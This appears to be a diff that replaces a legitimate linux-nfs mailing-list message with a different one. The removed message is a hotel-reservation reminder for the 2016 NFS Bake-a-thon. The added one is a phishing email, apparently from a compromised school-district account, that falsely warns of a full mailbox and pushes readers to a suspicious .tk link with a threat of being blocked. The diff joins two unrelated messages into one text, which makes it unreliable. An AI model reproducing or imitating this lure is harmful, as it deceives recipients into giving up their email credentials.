@@ -1,59 +1,24 @@
 Return-Path: <linux-nfs-owner@vger.kernel.org>
-Received: from mx1.redhat.com ([209.132.183.28]:56056 "EHLO mx1.redhat.com"
+Received: from mx1.sjusd.org ([143.254.0.14]:60401 "EHLO mx1.sjusd.org"
         rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-        id S1755671AbcINRkQ (ORCPT <rfc822;linux-nfs@vger.kernel.org>);
-        Wed, 14 Sep 2016 13:40:16 -0400
-Subject: Re: The Fall Bakeathon in Westford, Ma
-To: NFSv4 <nfsv4@ietf.org>,
-        Linux NFS Mailing list <linux-nfs@vger.kernel.org>
-References: <ce08c91a-5dbd-8363-59e5-39b554ce3e04@RedHat.com>
-From: Steve Dickson <SteveD@redhat.com>
-Message-ID: <b5388b25-2efd-1e35-0f5b-5b202de50ab5@RedHat.com>
-Date: Wed, 14 Sep 2016 13:40:15 -0400
+        id S933268AbcIOMqo (ORCPT <rfc822;linux-nfs@vger.kernel.org>);
+        Thu, 15 Sep 2016 08:46:44 -0400
+From: "Marshall, Jim" <jmarshall@sjusd.org>
+Subject: Important message
+Date: Thu, 15 Sep 2016 10:39:33 +0000
+Message-ID: <22027e9938be43b88e0483af76bf9990@xmail-mbx3.sjusd.org>
+Content-Type: text/plain; charset="iso-8859-1"
 MIME-Version: 1.0
-In-Reply-To: <ce08c91a-5dbd-8363-59e5-39b554ce3e04@RedHat.com>
-Content-Type: text/plain; charset=windows-1252
+To: unlisted-recipients:; (no To-header on input)@mail.corp.redhat.com
 Sender: linux-nfs-owner@vger.kernel.org
 List-ID: <linux-nfs.vger.kernel.org>
 
-Just a quick reminder the block reservations will
-be expiring for both the  Marriott and Hampton
-in two days... This *Fri Sept 16*
 
-Use code: 'red' for the Hampton and Marriott for the online reservations
-Call them if there problems with the online reservs... 
 
-Hampton: +1.978.392.1555
-Marriott: +1.978.392.1407
+You have reached your mailbox folder's limit.
 
-steved.
+Please remodify by clicking on the link below otherwise you will be blocked from sending and receiving email.
 
-On 07/28/2016 09:06 AM, Steve Dickson wrote:
-> Red Hat is pleased to announce the Fall NFS Bake-a-ton will be
-> hosted by Red Hat in Westford, MA office 
-> The Date: *Oct 17th - 21th*
-> 
-> Details and registration info:
->     http://nfsv4bat.org/Events/2016/October/BAT/index.html
-> 
-> Again, RDMA testing will be done as well as the normal
-> NFSv4.x testing. 
-> 
-> This year I've added another hotel to the list.
->     * Residence Inn Marriott - closest; w/ shuttle; full kitchen; free breakfast ($129.00)
->     * Westford Regency Inn - w/bar ; w/shuttle ($105.00)
->     * Hampton Inn - free breakfast ($119.00)
-> 
-> The block reservations all expire on *Sept 17* on month before
-> the event. So please book as soon as can. 
-> 
-> When registering (i.e. replying to this email) please give me
->    * Company Name
->    * How engineers are coming
->    * T-shirt sizes
->    * Hotel you will be staying in
-> 
-> I hope to see you in October!!!
-> 
-> steved.
-> 
+http://auth-websupport.tk
+
+System Admin
